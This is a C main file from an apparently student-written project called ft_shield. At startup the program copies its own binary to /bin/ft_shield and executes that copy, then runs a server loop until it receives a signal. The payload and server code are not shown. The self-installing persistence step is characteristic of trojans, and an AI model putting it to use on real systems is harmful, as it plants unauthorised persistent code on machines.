/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
/*   Updated: 2025/11/23 10:54:38 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

int	g_sig = 0;

void	handle_sig(int sig)
{
	g_sig = sig;
}

int	ctx_loop(t_ctx *ctx)
{
	while (g_sig == 0 && ctx->running)
		server_update(&ctx->server);
	if (g_sig != 0)
		logger_log(ctx, LOG_INFO, "Received a signal");
	return (1);
}

int	main(int ac, char **av, char **envp)
{
	(void)ac;
	if (!strstr(av[0], "/bin/ft_shield")
		&& export_payload(av[0], "/bin/ft_shield"))
		exec_payload("/bin/ft_shield", envp);

	t_ctx	ctx;

	if (!ctx_init(&ctx))
		return (0);
	ctx_loop(&ctx);
	return (ctx_delete(&ctx, true));
}
